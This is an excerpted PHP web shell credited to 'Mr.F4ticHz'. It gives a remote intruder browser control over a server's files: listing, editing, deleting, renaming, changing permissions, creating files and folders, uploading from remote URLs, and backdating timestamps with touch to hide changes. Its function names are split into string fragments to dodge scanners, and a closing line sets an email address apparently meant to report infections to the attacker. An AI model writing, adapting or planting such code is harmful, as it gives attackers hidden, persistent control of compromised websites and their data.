...
function author() {
	echo "<center><br>Mr".".F"."4ticHz - 2"."02"."2<br><a href='https://sh"."el"."l.bre"."bes"."bx".".biz.id/' target='_blank'>Mr."."Fn"."4t"."cHz"."am</a></center>";
	exit();
}
...
<input type="text" name="darilink" class="up" placeholder="https://Fn4tichz'.'.my.id/up'.'.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="fi'.'le.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
</form>';
...
if (isset($_GET['lokasie'])) {
	...
	author();
} elseif (isset($_POST['bbx']) && $_POST['pilih'] == "hapus") {
	if ($idi($_POST['bbx']) && $fxt($_POST['bbx'])) {
		xrd($_POST['bbx']);
		if ($fxt($_POST['bbx'])) {
	...
	} elseif ($ifi($_POST['bbx']) && $fxt($_POST['bbx'])) {
		@$ulk($_POST['bbx']);
		if ($fxt($_POST['bbx'])) {
	...
	if (!isset($_POST['cemod'])) {
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo "<center>Fi"."le : ".htmlspecialchars($_POST['bbx'])."<br>";
		} else {
			echo "<center>D"."ir : ".htmlspecialchars($_POST['bbx'])."<br>";
		}
		echo '<form method="post">
		Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['bbx'])), -4).'" />
		<input type="hidden" name="bbx" value="'.$_POST['bbx'].'">
		...
		$cm = @$chm($_POST['bbx'], $ocd($_POST['perm']));
		if ($cm == true) {
...
} elseif (isset($_POST['bbx']) && $_POST['pilih'] == "ubahnama") {
	if (isset($_POST['gantin'])) {
		$namabaru = $_GET['bbx']."/".$_POST['newname'];
		$ceen = "re"."na"."me";
		if (@$ceen($_POST['bbx'], $namabaru) === true) {
			...
			<input type="hidden" name="bbx" value="'.$_POST['newname'].'">
		...
		echo '<form method="post">
		New Name : <input name="newname" type="text" class="up" size="20" value="'.htmlspecialchars($bsn($_POST['bbx'])).'" />
		<input type="hidden" name="bbx" value="'.$_POST['bbx'].'">
		<input type="hidden" name="pilih" value="ubahnama">';
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo '<input type="hidden" name="type" value="fi'.'le">';;
	...
	if (isset($_POST['gasedit'])) {
		$edit = @$fpt($_POST['bbx'], $_POST['src']);
		if ($fgt($_POST['bbx']) == $_POST['src']) {
			green("Ed"."it Fi"."le Suc"."ce"."ss !");
		} else {
			red("Ed"."it Fi"."le Fai"."led !");
		}
	}
	echo "<center>Fi"."le : ".htmlspecialchars($_POST['bbx'])."<br><br>";
	echo '<form method="post">
	<textarea cols=80 rows=20 name="src">'.htmlspecialchars($fgt($_POST['bbx'])).'</textarea><br>
	<input type="hidden" name="bbx" value="'.$_POST['bbx'].'">
...
} elseif (isset($_POST['bbx']) && $_POST['pilih'] == "ubahtanggal") {
	if (isset($_POST['tanggale'])) {
		$stt = "st"."rtot"."ime";
		$tch = "t"."ou"."ch";
		$tanggale = $stt($_POST['tanggal']);
		if (@$tch($_POST['bbx'], $tanggale) === true) {
			green("Change Da"."te Succ"."ess !");
			$det = "da"."te";
			$ftm = "fi"."le"."mti"."me";
			$b = $det("d F Y H:i:s", $ftm($_POST['bbx']));
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo "<center>Fi"."le : ".htmlspecialchars($_POST['bbx'])."<br>";
			} else {
				echo "<center>D"."ir : ".htmlspecialchars($_POST['bbx'])."<br>";
...
} elseif (isset($_POST['bbx']) && $_POST['pilih'] == "dunlut") {
	$dunlute = $_POST['bbx'];
...
} elseif (isset($_POST['bbx']) && $_POST['pilih'] == "fo"."ld"."er") {
    if ($isw("./") || $ird("./")) {
        $loke = $_POST['bbx'];
        if (isset($_POST['buatfolder'])) {
            ...
            if ($buatf == true) {
                ...
                echo '<input type="hidden" name="bbx" value="'.$_POST['bbx'].'">
            ...
            echo '<form method="post"><center>Folder : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatfolder" value="Create folder" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
            echo '<input type="hidden" name="bbx" value="'.$_POST['bbx'].'"><input type="hidden" name="pilih" value="folder"></form>';
        }
    }
    ...
    if ($isw("./") || $isr("./")) {
        ...
        if (isset($_POST['buatfi'.'le'])) {
            ...
            if ($fxt($loke."/".$_POST['fi'.'lebaru'])) {
                ...
                echo '<input type="hidden" name="bbx" value="'.$_POST['lok'.'nya'].'">
            ...
            echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
            echo '<input type="hidden" name="bbx" value="'.$_POST['lok'.'nya'].'"><input type="hidden" name="pilih" value="fi'.'le"></form>';
        }
    }
}
...
echo "<td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?bbx=".$euybrekw."\">..</a></td>
<td><center>--</center></td>
...
echo "</center></td>
<td><center><form method=\"POST\" action=\"?pilihan&bbx=$lokasi\">
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$ppkcina\">
<input type=\"hidden\" name=\"bbx\" value=\"$lokasi/$ppkcina\">
...
foreach($lokasinya as $ppkcina){
	...
	echo "<tr>";
	echo "<td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?bbx=".$euybre."\">".$ppkcina."</a></td>
	<td><center>--</center></td>
...
echo "<tr>
<td>".cfn($euybray)." <a href=\"?lokasie=$lokasi/$mekicina&bbx=$lokasi\">$mekicina</a></td>
...
<form method=\"post\" action=\"?pilihan&bbx=$lokasi\">
...
<input type=\"hidden\" name=\"bbx\" value=\"$lokasi/$mekicina\">
</form></center></td>
</tr>";
}
...
$tujuanmail = '321a3sd2a1d@gmail.com, 321a3sd2a1d@gmail.com';
